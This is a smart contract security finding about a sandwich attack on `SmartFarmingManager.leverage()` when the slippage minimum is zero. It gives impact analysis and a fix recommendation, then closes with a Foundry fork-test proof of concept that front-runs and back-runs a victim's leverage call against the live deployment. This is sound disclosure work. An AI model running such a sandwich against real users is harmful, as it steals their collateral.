### Title
`SmartFarmingManager.leverage()` allows sandwich attacks when `depositAmountMin_` is zero - ([File: `contracts/SmartFarmingManager.sol`](contracts/SmartFarmingManager.sol))

### Summary
`SmartFarmingManager.leverage()` is publicly callable and allows the caller to set `depositAmountMin_` to zero. [1](#0-0)  Internally, the function invokes the configured swapper with `amountOutMin_ = 0`, so the swap itself has no independent execution-price protection. [2](#0-1)  An attacker can front-run the victim’s leverage transaction by selling the synthetic token into the same external market, cause the victim’s newly minted synthetic tokens to buy less collateral, and back-run the distorted market for a profit. [3](#0-2) 

### Finding Description
`leverage()` accepts `depositAmountMin_` as the only effective slippage bound and does not require it to be nonzero. [4](#0-3)  After transferring the caller’s input token, it flash-issues the synthetic token and records corresponding user debt. [5](#0-4)  It then swaps the entire `_issued` amount for collateral through the registry-configured `ISwapper`, passing zero as the swap-level minimum output. [2](#0-1)  The lower-level `_swap()` implementation directly forwards that zero minimum to `swapper_.swapExactInput()`. [6](#0-5) 

The subsequent `depositAmountMin_` check compares the final deposit against a caller-controlled value rather than a protocol-derived oracle quote or mandatory slippage cap. [7](#0-6)  The health check is also insufficient to prevent value extraction because substantial slippage can occur while the resulting position remains healthy. [8](#0-7)  For example, with a 50% collateral factor and 1.5x leverage, the debt leg could lose close to all of its swap output while `depositInUsd * collateralFactor >= debtInUsd` still holds. [9](#0-8) 

The same structure exists when `tokenIn_` differs from the collateral token because that preliminary swap also receives `amountOutMin_ = 0`. [10](#0-9)  `flashRepay()` has the same caller-controlled slippage pattern, although its post-check uses `swapAmountOutMin_` and the final health check. [11](#0-10) 

### Impact Explanation
An unprivileged attacker can extract part of the collateral value that should have been deposited to the victim’s leveraged position. [7](#0-6)  The victim still receives the full debt balance from `DebtToken.mint()`, but receives less collateral because the protocol’s swap accepted the manipulated price. [12](#0-11)  This is direct theft of user transaction proceeds through same-transaction AMM price manipulation, not merely a governance parameter concern. [13](#0-12) 

### Likelihood Explanation
No privileged role is needed: the attacker only needs to observe a pending `leverage()` call with a zero or insufficient `depositAmountMin_` and trade in the same external market used by the configured swapper. [14](#0-13)  The existing tests repeatedly invoke production `leverage()` with `depositAmountMin_ = 0`, confirming that zero protection is a supported call pattern. [15](#0-14)  The repository’s E2E flow also calls the deployed leverage interface with a zero minimum. [16](#0-15) 

`whenNotShutdown`, `nonReentrant`, and the registered-token checks do not prevent independent AMM transactions before or after the victim transaction. [17](#0-16)  The final health check limits only attacks that make the position undercollateralized and does not preserve the user’s expected swap execution. [18](#0-17) 

### Recommendation
Do not pass zero to `ISwapper.swapExactInput()` and do not rely solely on a user-supplied final deposit minimum. [6](#0-5)  For each external swap, calculate an oracle-derived expected output and enforce a protocol maximum slippage, while still applying the caller’s stricter minimum. [19](#0-18)  Apply the same protection to the preliminary `tokenIn_ -> collateral` swap and to `flashRepay()`. [20](#0-19) 

### Proof of Concept
A Foundry fork test can reproduce the issue against the deployed `SmartFarmingManager`, `PoolRegistry`, `DepositToken`, `DebtToken`, synthetic token, collateral token, configured swapper, and the live AMM route used by that swapper.

```solidity
function test_LeverageSandwich() public {
    // Resolve live deployment addresses on the selected fork.
    ISmartFarmingManager sfm = ISmartFarmingManager(SFM_PROXY);
    IPool pool = IPool(POOL_PROXY);
    IPoolRegistry registry = pool.poolRegistry();
    ISwapper swapper = registry.swapper();

    IERC20 collateral = IERC20(COLLATERAL);
    IDepositToken depositToken = IDepositToken(DEPOSIT_TOKEN);
    ISyntheticToken synth = ISyntheticToken(MS_TOKEN);
    IDebtToken debtToken = pool.debtTokenOf(synth);
    IUniswapV2Router02 router = IUniswapV2Router02(AMM_ROUTER);

    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    uint256 victimCollateral = 100 ether;
    uint256 leverage = 1.5 ether;

    deal(address(collateral), victim, victimCollateral);
    deal(address(collateral), attacker, 1_000 ether);

    // Attacker obtains synthetic inventory through normal public issuance.
    vm.startPrank(attacker);
    collateral.approve(address(depositToken), type(uint256).max);
    depositToken.deposit(1_000 ether, attacker);
    uint256 attackerDebt = 100 ether;
    debtToken.issue(attackerDebt, attacker);
    vm.stopPrank();

    address[] memory synthToCollateral = new address[](2);
    synthToCollateral[0] = address(synth);
    synthToCollateral[1] = address(collateral);

    address[] memory collateralToSynth = new address[](2);
    collateralToSynth[0] = address(collateral);
    collateralToSynth[1] = address(synth);

    // Front-run: sell synth into the same market and raise collateral's price.
    vm.startPrank(attacker);
    synth.approve(address(router), type(uint256).max);
    uint256 synthBefore = synth.balanceOf(attacker);
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        attackerDebt,
        0,
        synthToCollateral,
        attacker,
        block.timestamp
    );
    uint256 collateralBought = collateral.balanceOf(attacker) - 900 ether;
    vm.stopPrank();

    // Victim transaction observed with no effective slippage bound.
    vm.startPrank(victim);
    collateral.approve(address(sfm), type(uint256).max);
    (uint256 deposited, uint256 issued) = sfm.leverage(
        collateral,
        depositToken,
        synth,
        victimCollateral,
        leverage,
        0
    );
    vm.stopPrank();

    // Back-run: swap the acquired collateral back to synth.
    vm.startPrank(attacker);
    collateral.approve(address(router), type(uint256).max);
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        collateralBought,
        0,
        collateralToSynth,
        attacker,
        block.timestamp
    );
    uint256 synthAfter = synth.balanceOf(attacker);
    vm.stopPrank();

    // Victim receives materially less than the oracle-implied 150 collateral
    // while retaining approximately 50 units of debt.
    assertLt(deposited, victimCollateral + issued - 1 ether);
    assertGt(synthAfter, synthBefore);
}
```

The exact router and path should be the live route used by `registry.swapper()` on the fork being tested; the production repository exposes the swapper only through `ISwapper.swapExactInput()`, not an in-repository production router implementation. [21](#0-20)  The essential invariant demonstrated by the test is that `issued` remains fixed while `deposited` falls under attacker-controlled market conditions and the attacker ends with more synthetic tokens after the reverse trade. [22](#0-21)
